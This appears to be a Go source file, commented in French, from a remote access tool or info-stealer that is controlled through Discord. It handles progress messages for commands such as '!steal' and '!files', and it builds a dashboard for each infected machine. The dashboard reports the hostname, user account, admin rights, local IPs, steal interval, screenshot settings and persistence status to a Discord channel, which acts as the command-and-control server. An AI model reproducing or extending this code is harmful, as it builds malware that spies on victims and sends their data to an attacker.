// progress.go — messages de suivi pour les commandes longues.
//
// Une commande comme `!files` ou `!steal` peut prendre plusieurs minutes.
// Sans retour, on ne sait pas si elle tourne ou si elle a échoué. On publie un
// message « en cours », puis on l'édite à la fin avec le résultat : le salon
// ne garde qu'une ligne, lisible.
package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"
)

// osUser rend DOMAINE\utilisateur.
func osUser() string {
	u := os.Getenv("USERNAME")
	if d := os.Getenv("USERDOMAIN"); d != "" {
		return d + "\\" + u
	}
	return u
}

// privLabel dit si le processus est élevé.
func privLabel() string {
	if isElevated() {
		return "administrateur"
	}
	return "utilisateur standard"
}

// progressStart publie le message d'attente et rend son identifiant.
func progressStart(title string) (string, string) {
	ch := targetChannel()
	if ch == "" || cfg.BotToken == "" {
		return "", ""
	}
	raw, code, err := discordPostBody(fmt.Sprintf("/channels/%s/messages", ch), map[string]any{
		"content": "⏳ **" + title + "** — en cours…",
	})
	if err != nil || code >= 300 {
		return "", ""
	}
	var msg struct {
		ID string `json:"id"`
	}
	if json.Unmarshal(raw, &msg) != nil {
		return "", ""
	}
	return ch, msg.ID
}

// progressDone remplace le message d'attente par le résultat.
func progressDone(ch, id, text string) {
	if ch == "" || id == "" {
		return
	}
	if len(text) > 1900 {
		text = text[:1900] + "\n… (tronqué)"
	}
	_, code, err := discordPatchBody(fmt.Sprintf("/channels/%s/messages/%s", ch, id),
		map[string]any{"content": text})
	if err != nil || code >= 300 {
		// Édition impossible : on envoie au moins la réponse.
		botSendText(ch, text)
	}
}

// runWithProgress exécute une tâche longue en affichant son avancement.
func runWithProgress(title string, fn func() string) string {
	ch, id := progressStart(title)
	start := time.Now()
	result := fn()
	if result == "" {
		result = "terminé."
	}
	result += fmt.Sprintf(" _(%.0f s)_", time.Since(start).Seconds())
	if ch == "" || id == "" {
		return result
	}
	progressDone(ch, id, result)
	return ""
}

// channelLinks rend la liste cliquable des salons de la machine.
func channelLinks() string {
	var b strings.Builder
	names := allChannelNames()
	for i := 1; i < len(names); i++ { // le premier est le salon courant
		if id, _ := namedChannel(names[i]); id != "" {
			fmt.Fprintf(&b, "<#%s> ", id)
		}
	}
	return strings.TrimSpace(b.String())
}

// panelEmbed construit le tableau de bord d'une machine.
func panelEmbed() map[string]any {
	fields := []map[string]any{
		{"name": "Machine", "value": "`" + hostname() + "`", "inline": true},
		{"name": "Utilisateur", "value": "`" + osUser() + "`", "inline": true},
		{"name": "Privilèges", "value": privLabel(), "inline": true},
		{"name": "IP locale", "value": "`" + strings.Join(localIPs(), "`, `") + "`", "inline": false},
		{"name": "Salons", "value": channelLinks(), "inline": false},
		{"name": "Steal", "value": fmt.Sprintf("toutes les %d min", cfg.IntervalSteal), "inline": true},
		{"name": "Captures", "value": fmt.Sprintf("x%d, 20 s", shotScaleValue()), "inline": true},
		{"name": "Persistance", "value": persistStatus(), "inline": true},
	}
	return map[string]any{
		"title":       "🖥️  " + hostname(),
		"description": "Tape `!help` pour les commandes, ou utilise les réactions du bandeau.",
		"color":       0x5865f2,
		"fields":      fields,
		"timestamp":   time.Now().Format(time.RFC3339),
	}
}
